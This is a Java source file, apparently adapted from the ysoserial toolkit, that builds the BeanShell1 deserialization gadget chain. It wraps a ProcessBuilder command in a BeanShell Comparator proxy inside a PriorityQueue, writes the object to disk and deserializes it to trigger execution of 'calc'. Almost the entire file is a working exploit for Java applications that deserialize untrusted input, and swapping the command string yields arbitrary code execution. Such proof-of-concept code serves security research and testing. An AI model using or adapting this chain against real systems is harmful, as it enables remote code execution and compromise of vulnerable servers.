package com.r17a.ysoserial;


import bsh.Interpreter;
import bsh.XThis;
import com.supeream.serial.Reflections;
import java.io.*;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

public class BeanShell1 {

    public static void main(final String[] args) throws Exception {

        String command = "calc";
        String payload =
                "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                        Strings.join( // does not support spaces in quotes
                                Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                                ",", "\"", "\"") +
                        "}).start();return new Integer(1);}";

        // Create Interpreter
        Interpreter i = new Interpreter();

        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(priorityQueue);

        FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    static class Strings {
        public static String join(Iterable<String> strings, String sep, String prefix, String suffix) {
            final StringBuilder sb = new StringBuilder();
            boolean first = true;
            for (String s : strings) {
                if (!first) sb.append(sep);
                if (prefix != null) sb.append(prefix);
                sb.append(s);
                if (suffix != null) sb.append(suffix);
                first = false;
            }
            return sb.toString();
        }

        public static String repeat(String str, int num) {
            final String[] strs = new String[num];
            Arrays.fill(strs, str);
            return join(Arrays.asList(strs), "", "", "");
        }

        public static List<String> formatTable(List<String[]> rows) {
            final Integer[] maxLengths = new Integer[rows.get(0).length];
            for (String[] row : rows) {
                if (maxLengths.length != row.length) throw new IllegalStateException("mismatched columns");
                for (int i = 0; i < maxLengths.length; i++) {
                    if (maxLengths[i] == null || maxLengths[i] < row[i].length()) {
                        maxLengths[i] = row[i].length();
                    }
                }
            }

            final List<String> lines = new LinkedList<String>();
            for (String[] row : rows) {
                for (int i = 0; i < maxLengths.length; i++) {
                    final String pad = repeat(" ", maxLengths[i] - row[i].length());
                    row[i] = row[i] + pad;
                }
                lines.add(join(Arrays.asList(row), " ", "", ""));
            }
            return lines;
        }
    }
}

